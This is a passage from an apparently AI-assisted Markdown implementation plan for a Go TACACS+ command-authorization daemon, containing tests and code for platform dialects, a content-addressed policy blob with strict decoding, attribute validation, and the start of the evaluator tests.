		for k, v := range d.Levels {
			levels[k] = append([]string(nil), v...)
		}
		d.Levels = levels
	}
	return d
}

// Authorizes reports whether the platform declares capability c.
func (d Dialect) Authorizes(c string) bool {
	for _, s := range d.Supports {
		if s == c {
			return true
		}
	}
	return false
}

// Render returns the attributes this platform renders for exactly this level,
// without following a parent chain (the policy's to follow). ok is false for a
// level the platform does not map; a platform with no Levels maps every level
// to nothing.
func (d Dialect) Render(level string) (attrs []string, ok bool) {
	if d.Levels == nil {
		return nil, true
	}
	attrs, ok = d.Levels[level]
	return append([]string(nil), attrs...), ok
}

// PrivLvl is the priv-lvl number this platform gives exactly this level: the
// value of a `priv-lvl` attribute in its rendering, or plan 3's table where
// the platform renders none. ok is false where neither says.
func (d Dialect) PrivLvl(level string) (uint8, bool) {
	if d.Levels == nil {
		n, ok := ceilingLevels[level]
		return n, ok
	}
	for _, a := range d.Levels[level] {
		i := strings.IndexAny(a, "=*")
		if i < 0 || a[:i] != "priv-lvl" {
			continue
		}
		if n, err := strconv.ParseUint(a[i+1:], 10, 8); err == nil && n <= 15 {
			return uint8(n), true
		}
	}
	return 0, false
}
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/platform/ -count=1`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/platform/dialect.go internal/platform/dialect_test.go
git commit -m "feat: built-in platform dialects, borrowed ahead from plan 5

Pipe token, pipe_authorized, <cr>, abbreviations, capabilities, entity
classes and level rendering for the four shipped platforms. Measured
where the lab has measured (pipe_authorized false on EOS, NX-OS and
IOS-XE: tests/lab/results/L2-*.md; priv-lvl on vEOS: L16), fail-closed
where it has not (expands_abbreviations false everywhere, L21; operator
unmapped).

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 5: The compiled blob, format version 2

**Files:**
- Create: `internal/engine/term.go`, `internal/engine/blob.go`, `internal/engine/attrs.go`
- Test: `internal/engine/blob_test.go`

**Interfaces:**
- Produces:
  - `type Kind uint8` with `Rest`, `Any`, `Class`, `Regex`, `Word` and `func (Kind) Rank() int`
    (0, 1, 2, 2, 3); `type Term struct { Kind Kind; Text string }`;
    `func ParseRule(rule string) ([]Term, error)`; `func CanonicalRule(rule string) string`.
  - `const Version = 2`; `type Blob struct { Version int; Bundle, Platform string; Normalize Normalize; Privilege string; Attributes []string; Rules []Rule; Pipe []string; Classes map[string][]string }`;
    `type Normalize struct { PipeToken string; PipeAuthorized, StripCR, ExpandsAbbreviations bool }`;
    `type Rule struct { Verdict, Rule, Role string }`; `const Permit, Deny = "permit", "deny"`.
  - `func HashOf(body []byte) string`; `func Encode(Blob) (body []byte, hash string, err error)`;
    `func Decode(hash string, body []byte) (Blob, error)`; `var ErrHashMismatch`.
  - `const MaxAttribute = 255`; `var Placeholders`; `func AttributeName(string) string`;
    `func Mandatory(string) bool`; `func CheckAttribute(string) error`;
    `type Values struct { Username, Principal, Device string }`;
    `func (Blob) SessionAttributes(Values) ([]string, error)`; `var ErrAttributeTooLong`.
  Task 6 compiles `Blob`; Task 10 builds it; Tasks 12, 13 and 17 `Encode`/`Decode` it.

The package is named `engine`, not `blob`, so plan 3's `internal/blob` keeps running until Task 13
removes it (Decided 1). A regex term and a class pattern compile case-insensitive unless they begin
`(?-i)` (spec §3 rule 3); `ParseRule` compiles them exactly as the matcher will, so a rule that
parses is a rule that runs.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/engine/blob_test.go -->
```go
package engine

import (
	"errors"
	"strings"
	"testing"
)

// eos is a small compiled blob in the shape the broker writes.
func eos() Blob {
	return Blob{Bundle: "sha256:policy", Platform: "arista_eos",
		Normalize: Normalize{PipeToken: "|", StripCR: true},
		Privilege: "admin", Attributes: []string{"priv-lvl=15", "home-directory*/home/{username}"},
		Rules: []Rule{
			{Verdict: Permit, Rule: "show **", Role: "read_only"},
			{Verdict: Deny, Rule: "interface @management", Role: "interface_tech"},
		},
		Pipe:    []string{"include **"},
		Classes: map[string][]string{"management": {`^Management[0-9]+$`}, "unused": {`^x$`}},
	}
}

// A blob is named by its content: one decision, one hash (spec §5.1.1). The
// canonical form is what makes that true — rule order, spacing and repeats,
// pattern order, and classes no rule names do not change the name.
func TestOneDecisionIsOneHash(t *testing.T) {
	body, h1, err := Encode(eos())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(h1, "sha256:") || HashOf(body) != h1 {
		t.Fatalf("hash %q", h1)
	}
	shuffled := eos()
	shuffled.Rules = []Rule{
		{Verdict: Deny, Rule: "interface   @management", Role: "interface_tech"},
		{Verdict: Permit, Rule: "show **", Role: "read_only"},
		{Verdict: Permit, Rule: " show ** ", Role: "read_only"},
	}
	shuffled.Classes = map[string][]string{"management": {`^Management[0-9]+$`, `^Management[0-9]+$`}}
	if _, h2, err := Encode(shuffled); err != nil || h2 != h1 {
		t.Fatalf("the same decision, reordered, got %s %v; want %s", h2, err, h1)
	}
	other := eos()
	other.Platform = "cisco_nxos"
	if _, h3, _ := Encode(other); h3 == h1 {
		t.Fatal("two platforms must not share a blob")
	}
	reordered := eos()
	reordered.Attributes = []string{"home-directory*/home/{username}", "priv-lvl=15"}
	if _, h4, _ := Encode(reordered); h4 == h1 {
		t.Fatal("attributes go on the wire in order; Encode must not reorder them")
	}
	in := eos()
	Encode(in)
	if in.Rules[0].Rule != "show **" || len(in.Classes) != 2 {
		t.Fatal("Encode must not mutate the caller's blob")
	}
}

func TestDecodeRoundTrips(t *testing.T) {
	body, hash, _ := Encode(eos())
	b, err := Decode(hash, body)
	if err != nil {
		t.Fatal(err)
	}
	if b.Version != Version || b.Platform != "arista_eos" || len(b.Rules) != 2 || len(b.Classes) != 1 ||
		b.Classes["management"][0] != `^Management[0-9]+$` || b.Attributes[1] != "home-directory*/home/{username}" {
		t.Fatalf("round trip: %+v", b)
	}
}

// A blob the daemon cannot fully decide with is refused, never half-read
// (spec §5.1.2). The hash proves the bytes are the ones named, not that this
// build understands them.
func TestDecodeRefusesWhatItCannotDecideWith(t *testing.T) {
	body, hash, _ := Encode(eos())
	tampered := []byte(strings.Replace(string(body), `show **`, `show *`, 1))
	if _, err := Decode(hash, tampered); !errors.Is(err, ErrHashMismatch) {
		t.Fatalf("a tampered body must be refused as a hash mismatch: %v", err)
	}
	const head = `{"version":2,"bundle":"b","platform":"arista_eos","normalize":{"pipe_token":"|","pipe_authorized":false,"strip_cr":true,"expands_abbreviations":false},"privilege":"","attributes":[],`
	for name, body := range map[string]string{
		"plan 3's slice blob": `{"platform":"arista_eos","privilege":15,"attributes":[],"permit":["**"],"deny":[]}`,
		"a newer version":     strings.Replace(head, `"version":2`, `"version":3`, 1) + `"rules":[],"pipe":[],"classes":{}}`,
		"an unknown field":    head + `"rules":[],"pipe":[],"classes":{},"extra":1}`,
		"trailing bytes":      head + `"rules":[],"pipe":[],"classes":{}} {}`,
		"no platform":         strings.Replace(head, `"arista_eos"`, `""`, 1) + `"rules":[],"pipe":[],"classes":{}}`,
		"no pipe token":       strings.Replace(head, `"pipe_token":"|"`, `"pipe_token":""`, 1) + `"rules":[],"pipe":[],"classes":{}}`,
		"a class with no pattern": head + `"rules":[{"verdict":"deny","rule":"interface @management","role":"r"}],` +
			`"pipe":[],"classes":{}}`,
		"a regex RE2 refuses": head + `"rules":[{"verdict":"deny","rule":"interface /(?!x)/","role":"r"}],"pipe":[],"classes":{}}`,
		"a verdict that is neither": head + `"rules":[{"verdict":"allow","rule":"show **","role":"r"}],` +
			`"pipe":[],"classes":{}}`,
		"a rule with no role":          head + `"rules":[{"verdict":"permit","rule":"show **","role":""}],"pipe":[],"classes":{}}`,
		"a non-trailing **":            head + `"rules":[{"verdict":"permit","rule":"show ** detail","role":"r"}],"pipe":[],"classes":{}}`,
		"an attribute with no sep":     strings.Replace(head, `"attributes":[]`, `"attributes":["priv-lvl"]`, 1) + `"rules":[],"pipe":[],"classes":{}}`,
		"an unknown substitution":      strings.Replace(head, `"attributes":[]`, `"attributes":["home*{home}"]`, 1) + `"rules":[],"pipe":[],"classes":{}}`,
		"a pipe rule that won't parse": head + `"rules":[],"pipe":["** include"],"classes":{}}`,
	} {
		if b, err := Decode(HashOf([]byte(body)), []byte(body)); err == nil {
			t.Errorf("%s: decoded %+v, want an error", name, b)
		}
	}
}

// Encode refuses what Decode would refuse: a daemon must never be handed a
// blob it cannot read.
func TestEncodeRefusesWhatDecodeRefuses(t *testing.T) {
	for name, mutate := range map[string]func(*Blob){
		"no platform":          func(b *Blob) { b.Platform = "" },
		"an undefined class":   func(b *Blob) { b.Classes = nil },
		"a bad attribute":      func(b *Blob) { b.Attributes = []string{"=15"} },
		"a rule with no role":  func(b *Blob) { b.Rules[0].Role = "" },
		"no pipe token":        func(b *Blob) { b.Normalize.PipeToken = "" },
		"an unparseable rule":  func(b *Blob) { b.Rules[0].Rule = "show int*" },
		"an unknown verdict":   func(b *Blob) { b.Rules[0].Verdict = "allow" },
		"an empty regex":       func(b *Blob) { b.Rules[0].Rule = "show //" },
		"a class not snake":    func(b *Blob) { b.Rules[0].Rule = "interface @Mgmt" },
		"a wildcard in a word": func(b *Blob) { b.Pipe = []string{"inc*"} },
	} {
		b := eos()
		mutate(&b)
		if _, _, err := Encode(b); err == nil {
			t.Errorf("%s: encoded, want an error", name)
		}
	}
}

// Spec §4's grammar: five term kinds, ranked 3, 2, 2, 1, 0.
func TestParseRule(t *testing.T) {
	terms, err := ParseRule("interface @physical /^Ethernet1$/ * **")
	if err != nil {
		t.Fatal(err)
	}
	want := []struct {
		kind Kind
		text string
		rank int
	}{{Word, "interface", 3}, {Class, "physical", 2}, {Regex, "^Ethernet1$", 2}, {Any, "", 1}, {Rest, "", 0}}
	for i, w := range want {
		if terms[i].Kind != w.kind || terms[i].Text != w.text || terms[i].Kind.Rank() != w.rank {
			t.Errorf("term %d: %+v rank %d, want %+v", i, terms[i], terms[i].Kind.Rank(), w)
		}
	}
	for rule, want := range map[string]string{
		"":               "empty",
		"show ** detail": "trailing-only",
		"show int*":      "whole term",
		"interface @":    "class name",
		"show //":        "empty regex",
		"show /(?=x)/":   "regex",
	} {
		if _, err := ParseRule(rule); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("ParseRule(%q) = %v, want an error mentioning %q", rule, err, want)
		}
	}
	if CanonicalRule("  show   version ") != "show version" {
		t.Error("CanonicalRule respaces")
	}
}

// Spec §6: exactly one separator's worth of structure, a name, 255 bytes, and
// the four substitutions and nothing else.
func TestCheckAttribute(t *testing.T) {
	for _, ok := range []string{"priv-lvl=15", "shell:roles*network-admin", `cisco-av-pair*shell:roles="x"`,
		"home-directory*/home/{username}", "F5-LTM-User-Partition*{device}"} {
		if err := CheckAttribute(ok); err != nil {
			t.Errorf("CheckAttribute(%q): %v", ok, err)
		}
	}
	for a, want := range map[string]string{
		"priv-lvl":                          "separator",
		"=15":                               "empty name",
		"priv lvl=15":                       "whitespace",
		"x=" + strings.Repeat("a", 254):     "255",
		"home-directory*/home/{user}":       "not a substitution",
		"home-directory*/home/{username}{}": "not a substitution",
	} {
		if err := CheckAttribute(a); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("CheckAttribute(%q) = %v, want an error mentioning %q", a, err, want)
		}
	}
	if AttributeName("shell:roles*x=y") != "shell:roles" || !Mandatory("priv-lvl=15") || Mandatory("priv-lvl*15") {
		t.Error("the separator is the first `=` or `*`")
	}
}

// Substitution happens per session, from the context and the device, and the
// result is refused rather than truncated when it will not fit on the wire.
func TestSessionAttributesSubstitute(t *testing.T) {
	b := eos()
	b.Attributes = []string{"home-directory*/home/{username}", "note*{principal} on {device} at {privilege}"}
	got, err := b.SessionAttributes(Values{Username: "alice", Principal: "user:alice@example.com", Device: "leaf-01"})
	if err != nil {
		t.Fatal(err)
	}
	if got[0] != "home-directory*/home/alice" || got[1] != "note*user:alice@example.com on leaf-01 at admin" {
		t.Fatalf("substituted: %q", got)
	}
	if b.Attributes[0] != "home-directory*/home/{username}" {
		t.Fatal("SessionAttributes must not rewrite the blob")
	}
	if _, err := b.SessionAttributes(Values{Username: strings.Repeat("a", 250)}); !errors.Is(err, ErrAttributeTooLong) {
		t.Fatalf("an over-long substitution: %v", err)
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/engine/ -count=1`
Expected: FAIL to build — `undefined: Blob` (the package has only its test file).

- [ ] **Step 3: Write the terms, the format and the attributes**

<!-- write: internal/engine/term.go -->
```go
package engine

import (
	"errors"
	"fmt"
	"regexp"
	"strings"
)

// Kind is a rule term's kind (spec §4, "Grammar").
type Kind uint8

const (
	// Rest is `**`: zero or more arguments, trailing position only.
	Rest Kind = iota
	// Any is `*`: exactly one argument, any value.
	Any
	// Class is `@name`: one argument in a platform-defined entity class.
	Class
	// Regex is `/re/`: one argument matching an RE2 expression.
	Regex
	// Word is a literal argument, compared case-insensitively.
	Word
)

// Rank is the term's specificity at the position it covers (spec §4). A class
// and a regex share rank 2 deliberately: neither is reliably narrower.
func (k Kind) Rank() int {
	switch k {
	case Rest:
		return 0
	case Any:
		return 1
	case Class, Regex:
		return 2
	default:
		return 3
	}
}

// Term is one parsed term. Text is the word, the class name without `@`, or
// the regex body without its slashes.
type Term struct {
	Kind Kind
	Text string
}

var className = regexp.MustCompile(`^[a-z][a-z0-9_]*$`)

// ParseRule splits a rule into its terms and refuses what the grammar does not
// allow: an empty rule, `**` anywhere but last, a wildcard inside a word, a
// class name that is not snake_case, and a regex RE2 will not compile. The
// regex is compiled the way the matcher compiles it, case-insensitive unless it
// opts out with `(?-i)` (spec §3 rule 3), so a rule that parses is a rule that
// runs.
func ParseRule(rule string) ([]Term, error) {
	fields := strings.Fields(rule)
	if len(fields) == 0 {
		return nil, errors.New("an empty rule matches nothing; remove it")
	}
	terms := make([]Term, 0, len(fields))
	for i, f := range fields {
		switch {
		case f == "**":
			if i != len(fields)-1 {
				return nil, fmt.Errorf("rule %q: `**` is trailing-only (spec §4)", rule)
			}
			terms = append(terms, Term{Kind: Rest})
		case f == "*":
			terms = append(terms, Term{Kind: Any})
		case strings.HasPrefix(f, "@"):
			if !className.MatchString(f[1:]) {
				return nil, fmt.Errorf("rule %q: %q is not a class name; a class is `@` and a snake_case name", rule, f)
			}
			terms = append(terms, Term{Kind: Class, Text: f[1:]})
		case len(f) >= 2 && strings.HasPrefix(f, "/") && strings.HasSuffix(f, "/"):
			body := f[1 : len(f)-1]
			if body == "" {
				return nil, fmt.Errorf("rule %q: an empty regex matches every argument; write `*`", rule)
			}
			if _, err := compileTerm(body); err != nil {
				return nil, fmt.Errorf("rule %q: regex %q: %w", rule, f, err)
			}
			terms = append(terms, Term{Kind: Regex, Text: body})
		case strings.Contains(f, "*"):
			return nil, fmt.Errorf("rule %q: %q puts a wildcard inside a word; a wildcard is a whole term (spec §4)", rule, f)
		default:
			terms = append(terms, Term{Kind: Word, Text: f})
		}
	}
	return terms, nil
}

// CanonicalRule is the rule respaced to single spaces, which is the one
// spelling a blob and a log record carry.
func CanonicalRule(rule string) string { return strings.Join(strings.Fields(rule), " ") }

// compileTerm compiles a regex term or an entity-class pattern: RE2, and
// case-insensitive by default, because a case-sensitive deny fails open —
// `interface management1` would slip past `/^Management/` (spec §3 rule 3).
// A pattern that starts with `(?-i)` turns it back off for itself.
func compileTerm(pattern string) (*regexp.Regexp, error) {
	return regexp.Compile("(?i)" + pattern)
}
```

<!-- write: internal/engine/blob.go -->
```go
// Package engine is the policy engine's executor: the compiled blob a token
// names (spec §5.1.1, §5.1.2) and the one evaluator that decides against it.
// The daemon runs it on every authorization, `port49 policy replay` runs it on a
// logged record, and `port49 explain` runs it on a hypothetical one — the same
// code, so a replay that disagrees with the log is a finding and never a
// difference between two implementations (spec §5.7, "Replay").
//
// A blob is fully compiled: it carries the platform's normalization
// parameters and the patterns behind every entity class its rules name, so
// the daemon never reads a platform definition (spec §13, decision 9). It is
// content-addressed — its name is the hash of its bytes — and immutable.
package engine

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"slices"
	"strings"
)

// Version is the blob format this package writes and the only one it reads.
// Plan 3's slice blob has none, and is refused by name.
const Version = 2

// Blob is one compiled decision: the rules a principal's composed roles
// resolve to on one platform, and the session reply that goes with them.
type Blob struct {
	Version int `json:"version"`
	// Bundle names the policy the blob was compiled from (spec §5.7): until
	// plan 6 publishes versioned bundles, the sha256 of the policy file. It is
	// part of the content, so deduplication is per policy version and
	// platform (spec §5.1.2, "Cost").
	Bundle string `json:"bundle"`
	// Platform is the device platform the blob was compiled for. The daemon
	// refuses to answer from a blob compiled for another platform than the
	// device's (blob_platform_mismatch).
	Platform  string    `json:"platform"`
	Normalize Normalize `json:"normalize"`
	// Privilege is the abstract level the roles compose to (spec §6), or ""
	// when no role carries one. It is what `{privilege}` renders.
	Privilege string `json:"privilege"`
	// Attributes are the session authorization reply, platform then role then
	// grant layer already applied, in wire order. They may carry the four
	// substitutions of spec §6, which the daemon fills per session.
	Attributes []string `json:"attributes"`
	// Rules are every permit and deny of the composed roles. Pipe is the
	// output-modifier allowlist (spec §4, "Pipeline stages").
	Rules []Rule   `json:"rules"`
	Pipe  []string `json:"pipe"`
	// Classes are the patterns behind every `@class` the rules name, as this
	// platform defines them.
	Classes map[string][]string `json:"classes"`
}

// Normalize is the platform's dialect as the evaluator needs it (spec §3).
type Normalize struct {
	PipeToken            string `json:"pipe_token"`
	PipeAuthorized       bool   `json:"pipe_authorized"`
	StripCR              bool   `json:"strip_cr"`
	ExpandsAbbreviations bool   `json:"expands_abbreviations"`
}

// Rule is one command rule and the role that carries it. The role is on the
// rule so a decision names exactly one (spec §5.3).
type Rule struct {
	Verdict string `json:"verdict"` // "permit" | "deny"
	Rule    string `json:"rule"`
	Role    string `json:"role"`
}

// The two rule verdicts.
const (
	Permit = "permit"
	Deny   = "deny"
)

// ErrHashMismatch is a body that does not hash to the name it was stored or
// logged under: a store fault, or a log that was altered. Never a decision.
var ErrHashMismatch = errors.New("engine: blob body does not match its hash")

// HashOf names a body: "sha256:" and the hex digest of exactly these bytes.
func HashOf(body []byte) string {
	sum := sha256.Sum256(body)
	return "sha256:" + hex.EncodeToString(sum[:])
}

// Encode puts b in canonical form, refuses it if Decode would, and names it.
// Canonical form is what makes one decision one hash: rules respaced, sorted
// and deduplicated, the pipe list the same, class patterns sorted and
// deduplicated, classes no rule names dropped, and nil slices empty. Sorting is
// safe because evaluation is order-independent (spec §5.4). Attributes keep
// their order, which is the wire's.
func Encode(b Blob) ([]byte, string, error) {
	c := Blob{Version: Version, Bundle: b.Bundle, Platform: b.Platform, Normalize: b.Normalize,
		Privilege: b.Privilege, Attributes: append([]string{}, b.Attributes...),
		Rules: []Rule{}, Pipe: []string{}, Classes: map[string][]string{}}
	for _, r := range b.Rules {
		c.Rules = append(c.Rules, Rule{Verdict: r.Verdict, Rule: CanonicalRule(r.Rule), Role: r.Role})
	}
	slices.SortFunc(c.Rules, func(x, y Rule) int {
		return strings.Compare(x.Verdict+"\x00"+x.Rule+"\x00"+x.Role, y.Verdict+"\x00"+y.Rule+"\x00"+y.Role)
	})
	c.Rules = slices.Compact(c.Rules)
	for _, p := range b.Pipe {
		c.Pipe = append(c.Pipe, CanonicalRule(p))
	}
	slices.Sort(c.Pipe)
	c.Pipe = slices.Compact(c.Pipe)
	for name := range referencedClasses(c) {
		patterns := append([]string(nil), b.Classes[name]...)
		slices.Sort(patterns)
		c.Classes[name] = slices.Compact(patterns)
	}
	if err := c.check(); err != nil {
		return nil, "", err
	}
	body, err := json.Marshal(c)
	if err != nil {
		return nil, "", err
	}
	return body, HashOf(body), nil
}

// Decode parses a blob and refuses anything it cannot decide with, because a
// half-understood decision is how a daemon and a broker come to disagree about
// a rule (spec §5.1.2): a body that does not hash to its name, a field this
// build does not know, another format version, bytes after the value, and a
// blob whose rules would not run. Every refusal is an error, which the daemon
// answers blob_unavailable — never a permit.
func Decode(hash string, body []byte) (Blob, error) {
	if HashOf(body) != hash {
		return Blob{}, ErrHashMismatch
	}
	dec := json.NewDecoder(bytes.NewReader(body))
	dec.DisallowUnknownFields()
	var b Blob
	if err := dec.Decode(&b); err != nil {
		return Blob{}, fmt.Errorf("engine: blob %s: %w (a blob with no \"version\" is plan 3's, which this "+
			"daemon does not read)", hash, err)
	}
	if _, err := dec.Token(); err != io.EOF {
		return Blob{}, fmt.Errorf("engine: blob %s: bytes after the blob", hash)
	}
	if err := b.check(); err != nil {
		return Blob{}, fmt.Errorf("%w (blob %s)", err, hash)
	}
	return b, nil
}

// check refuses a blob this package cannot decide with. It is the one
// definition of "valid" that Encode and Decode share.
func (b Blob) check() error {
	if b.Version != Version {
		return fmt.Errorf("engine: blob format version %d; this build reads %d", b.Version, Version)
	}
	if b.Platform == "" {
		return errors.New("engine: blob names no platform")
	}
	if b.Normalize.PipeToken == "" {
		return errors.New("engine: blob has no pipe token")
	}
	for _, r := range b.Rules {
		if r.Verdict != Permit && r.Verdict != Deny {
			return fmt.Errorf("engine: rule %q: verdict %q is neither permit nor deny", r.Rule, r.Verdict)
		}
		if r.Role == "" {
			return fmt.Errorf("engine: rule %q names no role", r.Rule)
		}
		if _, err := ParseRule(r.Rule); err != nil {
			return fmt.Errorf("engine: %w", err)
		}
	}
	for _, p := range b.Pipe {
		if _, err := ParseRule(p); err != nil {
			return fmt.Errorf("engine: pipe %w", err)
		}
	}
	for name := range referencedClasses(b) {
		patterns := b.Classes[name]
		if len(patterns) == 0 {
			return fmt.Errorf("engine: a rule names @%s and the blob carries no pattern for it", name)
		}
		for _, p := range patterns {
			if _, err := compileTerm(p); err != nil {
				return fmt.Errorf("engine: @%s pattern %q: %w", name, p, err)
			}
		}
	}
	for _, a := range b.Attributes {
		if err := CheckAttribute(a); err != nil {
			return fmt.Errorf("engine: %w", err)
		}
	}
	return nil
}

// referencedClasses is the set of class names b's rules and pipe list use.
// Rules that do not parse contribute nothing; check refuses them itself.
func referencedClasses(b Blob) map[string]bool {
	out := map[string]bool{}
	add := func(rule string) {
		terms, err := ParseRule(rule)
		if err != nil {
			return
		}
		for _, t := range terms {
			if t.Kind == Class {
				out[t.Text] = true
			}
		}
	}
	for _, r := range b.Rules {
		add(r.Rule)
	}
	for _, p := range b.Pipe {
		add(p)
	}
	return out
}
```

<!-- write: internal/engine/attrs.go -->
```go
package engine

import (
	"errors"
	"fmt"
	"regexp"
	"strings"
)

// MaxAttribute is the longest AV pair RFC 8907 can carry: its argument length
// field is one byte (spec §6, "Validation without semantics").
const MaxAttribute = 255

// Placeholders is the whole substitution vocabulary of spec §6. A general
// template language would be a footgun; this is four names and nothing more.
var Placeholders = []string{"{username}", "{principal}", "{device}", "{privilege}"}

var placeholder = regexp.MustCompile(`\{[^{}]*\}`)

// AttributeName is the attribute's name: everything before its separator,
// which is the first `=` (mandatory) or `*` (optional).
func AttributeName(a string) string {
	if i := strings.IndexAny(a, "=*"); i >= 0 {
		return a[:i]
	}
	return a
}

// Mandatory reports whether the attribute is sent mandatory (`=`), which a
// device that cannot parse it answers by refusing the whole session.
func Mandatory(a string) bool {
	i := strings.IndexAny(a, "=*")
	return i >= 0 && a[i] == '='
}

// CheckAttribute is the structural validation spec §6 requires, since port49
// cannot check what an attribute means: a non-empty name before the first `=`
// or `*`, no whitespace in the name, at most MaxAttribute bytes as written,
// and no placeholder outside the vocabulary.
func CheckAttribute(a string) error {
	i := strings.IndexAny(a, "=*")
	switch {
	case i < 0:
		return fmt.Errorf("attribute %q has no `=` (mandatory) or `*` (optional) separator", a)
	case i == 0:
		return fmt.Errorf("attribute %q has an empty name", a)
	case strings.ContainsAny(a[:i], " \t"):
		return fmt.Errorf("attribute %q: the name contains whitespace", a)
	case len(a) > MaxAttribute:
		return fmt.Errorf("attribute %q is %d bytes; RFC 8907 carries at most %d", AttributeName(a), len(a), MaxAttribute)
	}
	for _, p := range placeholder.FindAllString(a, -1) {
		known := false
		for _, v := range Placeholders {
			known = known || p == v
		}
		if !known {
			return fmt.Errorf("attribute %q: %s is not a substitution; the vocabulary is %s",
				a, p, strings.Join(Placeholders, " "))
		}
	}
	return nil
}

// Values are what a session authorization fills the placeholders with, from
// the login context and the device (spec §5.2). The blob is shared across
// principals, so this happens in the daemon at each session authorization and
// never at mint.
type Values struct {
	Username, Principal, Device string
}

// ErrAttributeTooLong is a substituted attribute longer than RFC 8907 can
// carry. The broker checks the same values at mint and refuses there, so the
// daemon meeting it means the context no longer holds what was minted.
var ErrAttributeTooLong = errors.New("engine: a substituted attribute is longer than 255 bytes")

// SessionAttributes renders the session reply for one login: the blob's
// attributes with every placeholder filled, `{privilege}` from the blob's own
// level. It returns a fresh slice.
func (b Blob) SessionAttributes(v Values) ([]string, error) {
	r := strings.NewReplacer("{username}", v.Username, "{principal}", v.Principal,
		"{device}", v.Device, "{privilege}", b.Privilege)
	out := make([]string, 0, len(b.Attributes))
	for _, a := range b.Attributes {
		s := r.Replace(a)
		if len(s) > MaxAttribute {
			return nil, fmt.Errorf("%w: %s", ErrAttributeTooLong, AttributeName(a))
		}
		out = append(out, s)
	}
	return out, nil
}
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/engine/ -count=1`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/engine/
git commit -m "feat: the compiled blob, format version 2

The executor's half of the policy engine: rule terms (words, @class,
/re/, *, trailing **) parsed and compiled as the matcher will run
them; a content-addressed blob carrying the bundle, the platform's
normalization, the composed level, the session attributes with their
four placeholders, every rule with its role, the pipe allowlist and
each named class's patterns; canonical encoding so one decision is one
hash; strict decoding that refuses plan 3's blob by name.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 6: The evaluator — normalization, specificity, dominance, pipelines, abbreviations

**Files:**
- Create: `internal/engine/eval.go`
- Test: `internal/engine/eval_test.go`

**Interfaces:**
- Consumes: `Blob`, `ParseRule`, `compileTerm` (Task 5); `decision.Policy`, `decision.PolicyRule`
  (Task 2).
- Produces:
  - `type Program struct { Blob Blob; … }`; `func Compile(Blob) (*Program, error)` — expects a
    blob as `Decode` returns it (version set).
  - `func (Normalize) Normalize(raw []string) (vector []string, pipeline [][]string)`.
  - `func (*Program) Command(raw []string) Outcome`.
  - `func Dominates(x, y []int) bool`.
  - `type Match struct { Rule, Role string; Specificity []int }`;
    `type Outcome struct { Permit bool; Reason decision.Reason; Vector []string; Pipeline [][]string; Decided, Deny *Match; Permits []Match; Stage int }`;
    `func (Outcome) Policy(bundle, blob string) *decision.Policy`; `func (Outcome) ServerMsg() string`.
  Task 11's `Decide`, Task 12's `Engine`, Task 15's `Explain` and Task 17's `Replay` all call
  `Program.Command`: one evaluator.

`Command` takes the request's raw AV pairs and normalizes them itself, so replay re-normalizes a
record's `raw` with the same code that decided it (spec §5.7: normalization is where matcher bugs
live). The test list is spec §14's "Matching and precedence" section, case by case.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/engine/eval_test.go -->
```go
package engine

import (
	"math/rand"
	"reflect"
	"strings"
	"testing"

	"github.com/rhwendt/port49/internal/decision"
)

// program compiles a blob from "permit rule" and "deny rule" lines, one role
// per line ("role:verdict rule"), with EOS's classes and the default pipe
// allowlist.
func program(t *testing.T, expands bool, lines ...string) *Program {
	t.Helper()
	b := Blob{Version: Version, Bundle: "b", Platform: "arista_eos",
		Normalize: Normalize{PipeToken: "|", StripCR: true, ExpandsAbbreviations: expands},
		Pipe:      []string{"include **", "exclude **", "begin **", "section **", "json", "count", "no-more"},
		Classes: map[string][]string{
			"management":     {`^Management[0-9]+$`},
			"physical":       {`^Ethernet[0-9/.]+$`, `^Port-Channel[0-9]+$`},
			"backup_targets": {`^scp://backup\.example\.com/`},
		}}
	for _, l := range lines {
		role, rest, _ := strings.Cut(l, ":")
		verdict, rule, _ := strings.Cut(rest, " ")
		b.Rules = append(b.Rules, Rule{Verdict: verdict, Rule: rule, Role: role})
	}
	// Classes no rule names are dropped by Encode, not by Compile; keep only
	// what is named so the blob is one Encode would write.
	body, hash, err := Encode(b)
	if err != nil {
		t.Fatal(err)
	}
	decoded, err := Decode(hash, body)
	if err != nil {
		t.Fatal(err)
	}
	p, err := Compile(decoded)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// cmd builds the AV pairs a device sends for a typed command line, ending in
// the `<cr>` every measured platform sends (tests/lab/results/L10-*.md).
func cmd(line string) []string {
	f := strings.Fields(line)
	raw := []string{"service=shell", "cmd=" + f[0]}
	for _, a := range f[1:] {
		raw = append(raw, "cmd-arg="+a)
	}
	return append(raw, "cmd-arg=<cr>")
}

func expect(t *testing.T, p *Program, line string, permit bool, reason decision.Reason) Outcome {
	t.Helper()
	o := p.Command(cmd(line))
	if o.Permit != permit || o.Reason != reason {
		t.Errorf("%q: permit=%v %s, want permit=%v %s (deny %+v, permits %+v)",
			line, o.Permit, o.Reason, permit, reason, o.Deny, o.Permits)
	}
	return o
}

// Spec §14, "Matching and precedence": full-vector matching.
func TestRulesMatchTheFullVector(t *testing.T) {
	p := program(t, true, "r:permit show bgp summary", "r:permit show **")
	o := expect(t, p, "show bgp summary", true, decision.PermitDominates)
	if o.Decided.Rule != "show bgp summary" || !reflect.DeepEqual(o.Decided.Specificity, []int{3, 3, 3}) {
		t.Errorf("the more specific permit decides: %+v", o.Decided)
	}
	q := program(t, true, "r:permit show bgp summary")
	expect(t, q, "show bgp summary detail", false, decision.NoRuleMatched)
	expect(t, q, "show bgp", false, decision.NoRuleMatched)
}

// Case is compared, never changed: `SHOW RUN` matches `show run`, a class
